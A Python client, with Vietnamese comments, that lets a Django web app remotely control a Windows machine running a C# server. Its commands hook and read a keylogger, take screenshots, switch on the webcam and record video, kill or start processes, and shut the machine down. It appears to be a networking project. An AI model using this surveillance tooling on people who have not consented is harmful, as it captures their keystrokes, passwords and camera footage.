"""
Persistent Socket Client - Kết nối TCP duy trì lâu dài
Thay thế cho socket_client.py (mỗi lần tạo socket mới)

Kiến trúc:
- 1 socket được tạo khi connect
- Socket được LƯU LẠI và REUSE cho nhiều requests
- Socket chỉ đóng khi disconnect hoặc lỗi
"""
import socket
import base64
import threading
import logging
import atexit

logger = logging.getLogger(__name__)
class PersistentRemoteClient:
    """
    Client duy trì kết nối TCP persistent với C# Server
    
    Luồng hoạt động:
    1. connect() - Tạo socket và giữ lại
    2. send_command() - Reuse socket đã tạo
    3. disconnect() - Đóng socket khi không cần nữa
    """
    
    # Class-level dictionary: Lưu tất cả connections đang active
    # Key = session_id (từ Django session)
    # Value = PersistentRemoteClient instance
    _instances = {}
    _lock = threading.Lock()  # Thread-safe khi có nhiều requests cùng lúc
    
    @classmethod
    def cleanup_all(cls):
        """Cleanup tất cả connections khi Django shutdown"""
        logger.info("Cleaning up all persistent connections...")
        with cls._lock:
            for session_id, instance in list(cls._instances.items()):
                try:
                    instance.disconnect()
                    logger.info(f"Closed connection for session {session_id}")
                except Exception as e:
                    logger.error(f"Error closing session {session_id}: {e}")
            cls._instances.clear()
        logger.info("All connections cleaned up")
    
    def __init__(self, host, port, timeout=60):
        """
        Khởi tạo client (chưa connect)
        
        Args:
            host: IP của C# Server
            port: Port của C# Server (mặc định 5656)
            timeout: Timeout cho socket operations (60s cho persistent)
        """
        self.host = host
        self.port = port
        self.timeout = timeout
        
        # Socket objects (sẽ được tạo khi connect())
        self.socket = None
        self.reader = None  # Đọc text từ socket
        self.writer = None  # Ghi text vào socket
        
        self.connected = False
        
        # Mapping tên app thông dụng → tên process thực tế
        self.APP_ALIASES = {
            "edge": "msedge",
            "chrome": "chrome",
            "coc coc": "browser",
            "word": "winword",
            "excel": "excel",
            "powerpoint": "powerpnt",
            "notepad": "notepad",
            "calc": "calc",
            "paint": "mspaint",
            "cmd": "cmd"
        }
    
    @classmethod
    def get_or_create(cls, session_id, host, port, timeout=60):
        """
        Singleton Pattern: Mỗi session chỉ có 1 instance duy nhất
        
        Nếu session đã có connection → Trả về connection cũ
        Nếu chưa có → Tạo mới và lưu vào _instances
        
        Args:
            session_id: Django session key (unique cho mỗi user)
            host, port, timeout: Thông số kết nối
            
        Returns:
            PersistentRemoteClient instance
        """
        with cls._lock:  # Thread-safe
            if session_id not in cls._instances:
                # Chưa có → Tạo mới
                instance = cls(host, port, timeout)
                instance.connect()  # Connect ngay
                cls._instances[session_id] = instance
                logger.info(f"Created new persistent connection for session {session_id}")
            else:
                # Có rồi → Kiểm tra health, nếu chết thì xóa và tạo lại
                instance = cls._instances[session_id]
                if not instance.is_alive():
                    logger.warning(f"Existing connection for session {session_id} is dead, recreating...")
                    try:
                        instance.disconnect()
                    except:
                        pass
                    # Tạo mới
                    instance = cls(host, port, timeout)
                    instance.connect()
                    cls._instances[session_id] = instance
                    logger.info(f"Recreated connection for session {session_id}")
                else:
                    logger.info(f"Reusing existing connection for session {session_id}")
            
            return cls._instances[session_id]
    
    @classmethod
    def disconnect_session(cls, session_id):
        """
        Đóng connection của 1 session cụ thể
        
        Được gọi khi:
        - User bấm Disconnect
        - Session expire
        - Django server shutdown
        """
        with cls._lock:
            instance = cls._instances.pop(session_id, None)
            if instance:
                instance.disconnect()
                logger.info(f"Disconnected session {session_id}")
    
    def connect(self):
        """
        Tạo kết nối TCP đến C# Server và GIỮ LẠI socket
        
        Khác với non-persistent:
        - Non-persistent: Tạo → Dùng → Đóng ngay
        - Persistent: Tạo → Dùng nhiều lần → Đóng khi không cần
        """
        try:
            # Tạo TCP socket
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(self.timeout)
            
            # Kết nối đến C# Server
            self.socket.connect((self.host, self.port))
            
            # Tạo reader/writer để đọc/ghi text dễ dàng
            # buffering=1 = line buffering (flush sau mỗi \n)
            self.reader = self.socket.makefile('r', encoding='utf-8', newline='\r\n', buffering=1)
            self.writer = self.socket.makefile('w', encoding='utf-8', newline='\r\n', buffering=1)
            
            self.connected = True
            logger.info(f"Connected to {self.host}:{self.port}")
            
        except Exception as e:
            logger.error(f"Failed to connect: {str(e)}")
            self.connected = False
            raise
    
    def disconnect(self):
        """
        Đóng kết nối và cleanup resources
        
        Quan trọng: Phải gửi "QUIT" trước khi đóng socket
        để C# Server biết và thoát khỏi vòng lặp while(true)
        """
        try:
            if self.connected and self.writer:
                # Gửi tín hiệu QUIT để C# Server thoát HandleClientCommunication()
                self.writer.write("QUIT\n")
                self.writer.flush()
        except:
            pass  # Bỏ qua lỗi nếu socket đã đóng
        
        # Đóng tất cả resources
        if self.reader:
            try: self.reader.close()
            except: pass
        
        if self.writer:
            try: self.writer.close()
            except: pass
        
        if self.socket:
            try: self.socket.close()
            except: pass
        
        self.connected = False
        logger.info("Disconnected from server")
    
    def is_alive(self):
        """Kiểm tra xem socket còn sống không"""
        if not self.socket or not self.connected:
            return False
        try:
            # Send empty data để test connection
            self.socket.send(b'')
            return True
        except:
            return False
    
    def ensure_connected(self):
        """Đảm bảo socket đang connected, reconnect nếu chết"""
        if not self.is_alive():
            logger.warning("Socket died, reconnecting...")
            try:
                self.disconnect()
            except:
                pass
            self.connect()
    
    def recvall(self, n):
        """
        Helper: Nhận đủ n bytes từ socket
        Dùng cho nhận ảnh screenshot (binary data)
        
        Args:
            n: Số bytes cần nhận
            
        Returns:
            bytes: Dữ liệu nhận được
        """
        data = b''
        while len(data) < n:
            packet = self.socket.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data
    
    def send_command(self, command_type, sub_command=None, args=None):
        """
        GỬI LỆNH QUA PERSISTENT SOCKET (KHÔNG TẠO SOCKET MỚI!)
        
        Đây là hàm chính để giao tiếp với C# Server
        Reuse socket đã tạo từ connect()
        
        Args:
            command_type: KEYLOG, PROCESS, APPLICATION, TAKEPIC, SHUTDOWN, RESTART
            sub_command: XEM, KILL, START, HOOK, UNHOOK, STATUS, PRINT, CLEAR, TAKE
            args: Tham số bổ sung (process ID, tên process...)
            
        Returns:
            dict: {"status": "success/error", "data": ..., "message": ...}
        """
        # Auto-reconnect nếu socket chết
        try:
            self.ensure_connected()
        except Exception as e:
            logger.error(f"Failed to ensure connection: {e}")
            return {"status": "error", "message": "Not connected to server and reconnect failed", "data": None}
        
        if not self.connected:
            return {"status": "error", "message": "Not connected to server", "data": None}
        
        response_data = None
        status = "error"
        msg = ""
        
        try:
            # === GỬI LỆNH CHÍNH ===
            self.writer.write(f"{command_type}\n")
            self.writer.flush()
            
            # === XỬ LÝ THEO TỪNG LOẠI LỆNH ===
            
            # --- PROCESS & APPLICATION ---
            if command_type in ["PROCESS", "APPLICATION"]:
                if sub_command == "XEM":  # Lấy danh sách
                    self.writer.write("XEM\n")
                    self.writer.flush()
                    
                    # Đọc số lượng process
                    count_line = self.reader.readline()
                    if count_line:
                        count = int(count_line.strip())
                        data_list = []
                        
                        # Đọc thông tin từng process (3 dòng: name, id, threads)
                        for _ in range(count):
                            p_name = self.reader.readline().strip()
                            p_id = self.reader.readline().strip()
                            p_threads = self.reader.readline().strip()
                            data_list.append({
                                "name": p_name,
                                "id": p_id,
                                "threads": p_threads
                            })
                        
                        response_data = data_list
                        status = "success"
                
                elif sub_command in ["KILL", "START"]:
                    self.writer.write(f"{sub_command}\n")
                    self.writer.write(f"{sub_command}ID\n")
                    
                    # Xử lý alias (edge → msedge, word → winword)
                    final_args = args
                    if sub_command == "START" and args:
                        lower_arg = args.lower()
                        if lower_arg in self.APP_ALIASES:
                            final_args = self.APP_ALIASES[lower_arg]
                    
                    self.writer.write(f"{final_args}\n")
                    self.writer.flush()
                    
                    # Đọc kết quả
                    result = self.reader.readline().strip()
                    if "Successfully" in result:
                        status = "success"
                    msg = result
                
                # QUAN TRỌNG: Gửi QUIT để thoát khỏi module (KHÔNG đóng socket!)
                self.writer.write("QUIT\n")
                self.writer.flush()
            
            # --- SCREENSHOT ---
            elif command_type == "TAKEPIC":
                self.socket.sendall(b"TAKE\n")
                
                # Đọc kích thước ảnh
                size_buffer = b""
                while True:
                    char = self.socket.recv(1)
                    if char == b'\n' or not char:
                        break
                    size_buffer += char
                
                size_str = size_buffer.decode('utf-8').strip()
                if size_str.isdigit() and int(size_str) > 0:
                    # Nhận ảnh theo kích thước
                    img_data = self.recvall(int(size_str))
                    if img_data:
                        # Convert sang Base64 để hiển thị trên web
                        response_data = base64.b64encode(img_data).decode('utf-8')
                        status = "success"
                
                # Thoát module
                self.socket.sendall(b"QUIT\n")
            
            # --- KEYLOGGER ---
            elif command_type == "KEYLOG":
                if sub_command == "PRINT":
                    self.writer.write("PRINT\n")
                    self.writer.flush()
                    response_data = self.reader.readline().strip()
                    status = "success"
                
                elif sub_command in ["HOOK", "UNHOOK"]:
                    self.writer.write(f"{sub_command}\n")
                    self.writer.flush()
                    status = "success"
                    msg = "Keylogger Hooked (On)" if sub_command == "HOOK" else "Keylogger Unhooked (Off)"
                
                elif sub_command == "CLEAR":
                    self.writer.write("CLEAR\n")
                    self.writer.flush()
                    status = "success"
                    msg = self.reader.readline().strip()
                
                elif sub_command == "STATUS":
                    self.writer.write("STATUS\n")
                    self.writer.flush()
                    status_str = self.reader.readline().strip()
                    response_data = status_str
                    status = "success"
                
                # Thoát module
                self.writer.write("QUIT\n")
                self.writer.flush()
            
            # --- SHUTDOWN & RESTART ---
            elif command_type in ["SHUTDOWN", "RESTART"]:
                status = "success"
                msg = f"Sent {command_type} command"
                # Gửi QUIT để thoát
                self.writer.write("QUIT\n")
                self.writer.flush()
        
        except Exception as e:
            logger.error(f"Command error: {str(e)}")
            msg = f"Error: {str(e)}"
            # Nếu có lỗi nghiêm trọng → Đánh dấu disconnected
            self.connected = False
        
        return {"status": status, "data": response_data, "message": msg}
    
    # ==================== WEBCAM METHODS ====================
    
    def webcam_on(self):
        """
        Bật camera (chỉ preview, chưa ghi video)
        
        Returns:
            dict: {"success": bool, "message": str}
        """
        try:
            self.writer.write("WEBCAM\n")
            self.writer.flush()
            
            self.writer.write("ON\n")
            self.writer.flush()
            
            response = self.reader.readline().strip()
            
            if response == "CAMERA_ON":
                return {"success": True, "message": "Camera turned on"}
            else:
                return {"success": False, "message": response}
        
        except Exception as e:
            logger.error(f"Webcam ON error: {str(e)}")
            return {"success": False, "message": f"Error: {str(e)}"}
    
    def webcam_off(self):
        """
        Tắt camera
        
        Returns:
            dict: {"success": bool, "message": str}
        """
        try:
            self.writer.write("WEBCAM\n")
            self.writer.flush()
            
            self.writer.write("OFF\n")
            self.writer.flush()
            
            response = self.reader.readline().strip()
            
            # Thoát module webcam
            self.writer.write("QUIT\n")
            self.writer.flush()
            
            if response == "CAMERA_OFF":
                return {"success": True, "message": "Camera turned off"}
            else:
                return {"success": False, "message": response}
        
        except Exception as e:
            logger.error(f"Webcam OFF error: {str(e)}")
            return {"success": False, "message": f"Error: {str(e)}"}
    
    def webcam_get_frame(self):
        """
        Lấy 1 frame hiện tại từ camera (JPEG bytes)
        Dùng cho streaming preview
        
        Returns:
            bytes hoặc None
        """
        try:
            self.writer.write("WEBCAM\n")
            self.writer.flush()
            
            self.writer.write("GET_FRAME\n")
            self.writer.flush()
            
            # Đọc size
            size_str = self.reader.readline().strip()
            size = int(size_str)
            
            if size == 0:
                # Không có frame
                self.writer.write("QUIT\n")
                self.writer.flush()
                return None
            
            # Đọc bytes
            frame_data = b''
            while len(frame_data) < size:
                chunk = self.socket.recv(min(4096, size - len(frame_data)))
                if not chunk:
                    break
                frame_data += chunk
            
            # Thoát module
            self.writer.write("QUIT\n")
            self.writer.flush()
            
            return frame_data
        
        except Exception as e:
            logger.error(f"Get frame error: {str(e)}")
            return None
    
    def webcam_start_recording(self):
        """
        Bắt đầu ghi video (camera phải đã ON)
        
        Returns:
            dict: {"success": bool, "message": str}
        """
        try:
            self.writer.write("WEBCAM\n")
            self.writer.flush()
            
            self.writer.write("START_REC\n")
            self.writer.flush()
            
            response = self.reader.readline().strip()
            
            # Thoát module
            self.writer.write("QUIT\n")
            self.writer.flush()
            
            if response == "RECORDING_STARTED":
                return {"success": True, "message": "Recording started"}
            else:
                return {"success": False, "message": response}
        
        except Exception as e:
            logger.error(f"Start recording error: {str(e)}")
            return {"success": False, "message": f"Error: {str(e)}"}
    
    def webcam_stop_recording(self):
        """
        Dừng ghi video, nhận file video về
        
        Returns:
            dict: {
                "success": bool,
                "message": str,
                "filename": str,
                "file_size": int,
                "video_data": bytes
            }
        """
        try:
            self.writer.write("WEBCAM\n")
            self.writer.flush()
            
            self.writer.write("STOP_REC\n")
            self.writer.flush()
            
            # Đọc response: "RECORDING_STOPPED|filename|filesize"
            response = self.reader.readline().strip()
            
            if not response.startswith("RECORDING_STOPPED"):
                self.writer.write("QUIT\n")
                self.writer.flush()
                return {"success": False, "message": response}
            
            parts = response.split('|')
            filename = parts[1] if len(parts) > 1 else ""
            file_size = int(parts[2]) if len(parts) > 2 else 0
            
            if file_size == 0:
                self.writer.write("QUIT\n")
                self.writer.flush()
                return {"success": False, "message": "No video file generated"}
            
            # Đọc size confirmation
            size_str = self.reader.readline().strip()
            size = int(size_str)
            
            if size == 0:
                self.writer.write("QUIT\n")
                self.writer.flush()
                return {"success": False, "message": "Failed to receive video"}
            
            # Đọc video bytes (có thể rất lớn!)
            logger.info(f"Receiving video: {filename}, size: {size} bytes")
            video_data = b''
            while len(video_data) < size:
                chunk_size = min(1024 * 1024, size - len(video_data))  # 1MB chunks
                chunk = self.socket.recv(chunk_size)
                if not chunk:
                    break
                video_data += chunk
                
                # Log progress
                progress = (len(video_data) / size) * 100
                if len(video_data) % (10 * 1024 * 1024) == 0:  # Log every 10MB
                    logger.info(f"Received: {progress:.1f}%")
            
            # Thoát module
            self.writer.write("QUIT\n")
            self.writer.flush()
            
            return {
                "success": True,
                "message": "Recording stopped",
                "filename": filename,
                "file_size": file_size,
                "video_data": video_data
            }
        
        except Exception as e:
            logger.error(f"Stop recording error: {str(e)}")
            return {"success": False, "message": f"Error: {str(e)}"}
    
    def webcam_status(self):
        """
        Lấy trạng thái camera và recording
        
        Returns:
            dict: {
                "camera_on": bool,
                "recording": bool
            }
        """
        try:
            self.writer.write("WEBCAM\n")
            self.writer.flush()
            
            self.writer.write("STATUS\n")
            self.writer.flush()
            
            # Response: "camera_on:true|recording:false"
            response = self.reader.readline().strip()
            
            # Thoát module
            self.writer.write("QUIT\n")
            self.writer.flush()
            
            # Parse response
            parts = response.split('|')
            camera_on = parts[0].split(':')[1] == 'true' if len(parts) > 0 else False
            recording = parts[1].split(':')[1] == 'true' if len(parts) > 1 else False
            
            return {
                "camera_on": camera_on,
                "recording": recording
            }
        
        except Exception as e:
            logger.error(f"Get status error: {str(e)}")
            return {"camera_on": False, "recording": False}


# ==================== CLEANUP ON DJANGO SHUTDOWN ====================
# Đăng ký cleanup function để đóng tất cả socket khi Django shutdown
atexit.register(PersistentRemoteClient.cleanup_all)
